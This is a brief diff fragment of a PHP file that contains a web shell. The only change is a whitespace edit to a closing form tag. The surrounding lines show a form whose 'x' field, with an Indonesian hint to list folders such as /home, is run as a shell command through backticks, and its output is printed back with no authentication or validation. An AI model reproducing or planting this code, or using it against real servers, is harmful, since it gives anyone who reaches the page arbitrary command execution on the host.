@@ -57,7 +57,7 @@ if(isset($_POST['x']))
 echo 'Jika ingin ke folder lain misal /home maka bisa ketik ls -l /home <br /> <br /><form action="" method="POST">
 <input type="text" name="x" value="ls -l">
 <input type="submit" value="Execute">
-    </form>';?>
+</form>';?>
 <pre>
 <? echo `{$_POST['x']};` ?> </pre> <? die(); ?></center>
 <?php 
